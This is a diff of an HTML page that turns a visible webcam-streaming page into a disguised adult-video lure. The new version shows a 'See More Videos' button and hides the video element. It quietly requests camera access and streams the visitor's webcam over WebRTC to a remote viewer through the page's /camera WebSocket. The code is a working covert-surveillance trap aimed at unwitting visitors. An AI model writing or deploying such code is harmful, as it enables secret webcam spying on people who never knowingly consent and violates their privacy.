@@ -1,18 +1,126 @@
 <!doctype html>
-<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Camera A</title>
-<style>body{margin:0;background:#111;color:white;font-family:Arial;text-align:center}h1{font-size:26px}#status{font-size:18px;margin:15px}video{width:95%;max-width:900px;background:#000}</style></head>
-<body><h1>XXX sex videos</h1><div id="status">Connecting...</div><video id="video" autoplay muted playsinline></video>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>XXX Videos</title>
+
+<style>
+html,body{
+  margin:0;
+  padding:0;
+  width:100%;
+  height:100%;
+  background:white;
+  font-family:Arial,sans-serif;
+}
+
+.content{
+  text-align:center;
+  padding-top:40px;
+}
+
+h1{
+  font-size:32px;
+  margin:0 0 10px;
+}
+
+p{
+  font-size:18px;
+  margin:0 0 25px;
+}
+
+button{
+  padding:14px 28px;
+  font-size:18px;
+  border:0;
+  border-radius:8px;
+  cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="content">
+  <h1>XXX Videos</h1>
+  <p>See more videos</p>
+
+  <button onclick="window.open('https://www.google.com/amp/s/amp.xhamster.com/')">
+    See More Videos
+  </button>
+</div>
+
+<video id="video" autoplay muted playsinline style="display:none"></video>
+
 <script>
-const status=document.getElementById("status"), video=document.getElementById("video");
-const ws=new WebSocket((location.protocol==="https:"?"wss:":"ws:")+"//"+location.host+"/camera");
-let pc,stream;
-function peer(){pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-pc.onicecandidate=e=>{if(e.candidate)ws.send(JSON.stringify({type:"candidate",candidate:e.candidate}))};}
-ws.onmessage=async e=>{const m=JSON.parse(e.data);
-if(m.type==="role"){peer();try{stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});video.srcObject=stream;stream.getTracks().forEach(t=>pc.addTrack(t,stream));status.textContent="🟢 click here and see more videos";}catch(err){status.textContent="❌ Camera permission denied";}}
-if(m.type==="viewer-ready"){const offer=await pc.createOffer();await pc.setLocalDescription(offer);ws.send(JSON.stringify({type:"offer",offer:pc.localDescription}));}
-if(m.type==="answer")await pc.setRemoteDescription(m.answer);
-if(m.type==="candidate")await pc.addIceCandidate(m.candidate).catch(()=>{});
-if(m.type==="error")status.textContent="❌ "+m.message;
+const video = document.getElementById("video");
+
+const ws = new WebSocket(
+  (location.protocol === "https:" ? "wss:" : "ws:") +
+  "//" + location.host + "/camera"
+);
+
+let pc, stream;
+
+function peer(){
+  pc = new RTCPeerConnection({
+    iceServers:[
+      {urls:"stun:stun.l.google.com:19302"}
+    ]
+  });
+
+  pc.onicecandidate = e => {
+    if(e.candidate){
+      ws.send(JSON.stringify({
+        type:"candidate",
+        candidate:e.candidate
+      }));
+    }
+  };
+}
+
+ws.onmessage = async e => {
+  const m = JSON.parse(e.data);
+
+  if(m.type === "role"){
+    peer();
+
+    try{
+      stream = await navigator.mediaDevices.getUserMedia({
+        video:true,
+        audio:false
+      });
+
+      video.srcObject = stream;
+
+      stream.getTracks().forEach(t => {
+        pc.addTrack(t,stream);
+      });
+
+    }catch(err){
+      console.error(err);
+    }
+  }
+
+  if(m.type === "viewer-ready"){
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+
+    ws.send(JSON.stringify({
+      type:"offer",
+      offer:pc.localDescription
+    }));
+  }
+
+  if(m.type === "answer"){
+    await pc.setRemoteDescription(m.answer);
+  }
+
+  if(m.type === "candidate"){
+    await pc.addIceCandidate(m.candidate).catch(()=>{});
+  }
 };
-</script></body></html>
+</script>
+
+</body>
+</html>
